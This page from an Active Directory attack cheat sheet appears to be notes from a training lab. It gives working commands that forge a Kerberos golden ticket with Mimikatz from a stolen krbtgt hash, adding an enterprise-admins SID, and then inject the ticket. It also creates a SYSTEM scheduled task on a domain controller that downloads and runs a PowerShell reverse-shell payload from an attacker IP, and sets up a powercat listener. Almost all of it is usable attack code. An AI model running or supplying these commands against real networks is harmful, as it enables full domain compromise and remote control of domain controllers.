---
layout: page
title: "# Domain access, PrivEsc to EntAdmin using krbtgt Hash, Rev Shell schtasks"
permalink: /ad_cheatsheets/domain_access_privesc_to_entadmin_with_krbtgthash
---

# Domain access, PrivEsc to EntAdmin using krbtgt Hash, Rev Shell schtasks

## We already have the hash, create TGT ticket

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511/sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35/ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
```

## Inject Ticket

```powershell
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi"'
```

## Reverse Shell

```powershell
schtasks /create /S mcorp-dc.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck648" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.48/Invoke-PowerShellTcpEx.ps1''')'"

powercat -l -v -p 443 -t 1000

schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck648"
```

## Resources

[swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
